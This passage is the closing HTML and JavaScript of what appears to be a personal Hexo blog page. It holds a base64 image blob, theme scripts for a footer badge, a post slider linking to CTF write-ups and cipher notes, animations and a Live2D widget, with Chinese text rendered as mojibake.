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" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="æœ¬ç«™é‡‡ç”¨çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«4.0å›½é™…è®¸å¯åè®®è¿›è¡Œè®¸å¯" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
    console.log('å·²æŒ‚è½½butterfly_footer_beautify')
    parent_div_git.insertAdjacentHTML("beforeend",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_footer_beautify_injector_config();
  }
  else if (epage === cpage){
    butterfly_footer_beautify_injector_config();
  }
  </script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/5.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/op/image/hutao/hutao.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-10-27</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/5.html&quot;);" href="javascript:void(0);" alt="">å¤å…¸å¯†ç </a><div class="blog-slider__text">å¤å…¸å¯†ç å¤§å…¨</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/5.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/0.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/op/image/qiqi/qiqi.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-08-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/0.html&quot;);" href="javascript:void(0);" alt="">Markdownè¯­æ³•ä¸å¤–æŒ‚æ ‡ç­¾å†™æ³•æ±‡æ€»</a><div class="blog-slider__text">ğŸ¥§æœ¬æ–‡æ±‡æ€»Markdownæ ¼å¼ä»¥åŠå¤–æŒ‚æ ‡ç­¾åœ¨ç½‘é¡µç«¯çš„æ¸²æŸ“æ•ˆæœï¼Œå¯ä½œä¸ºæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/0.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/17.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/åœ–ç‰‡ (5).jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-11-29</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/17.html&quot;);" href="javascript:void(0);" alt="">CTFä¹‹CTFHubå­¦ä¹ è®°å½•</a><div class="blog-slider__text">CTFHubæŠ€èƒ½æ ‘+è¯¦ç»†Write up</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/17.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/19.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/45136636_p0.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-12-10</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/19.html&quot;);" href="javascript:void(0);" alt="">CTFä¹‹WebGoatå­¦ä¹ è®°å½•</a><div class="blog-slider__text">WebGoat8.22ä¹‹Write up</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/19.html&quot;);" href="javascript:void(0);" alt="">è¯¦æƒ…       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('å·²æŒ‚è½½butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__bounceInLeft');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('blog-slider swiper-container-fade swiper-container-horizontal');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('catalog_magnet');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '1.5sÂ·');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '2s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('pagination');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__jackInTheBox');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__flipInY');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__animated');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__slideInRight');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__flipInY');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__animated');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('gitZone');
      var item_html = '<div class="recent-post-item" id="gitcalendarBar" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 320px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('å·²æŒ‚è½½gitcalendar')
      }

    if( document.getElementById('gitZone') && (location.pathname ==='/site/census/'|| '/site/census/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("/api?null",['#d9e0df', '#c6e0dc', '#a8dcd4', '#9adcd2', '#89ded1', '#77e0d0', '#5fdecb', '#47dcc6', '#39dcc3', '#1fdabe', '#00dab9'],'null')
    }
  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>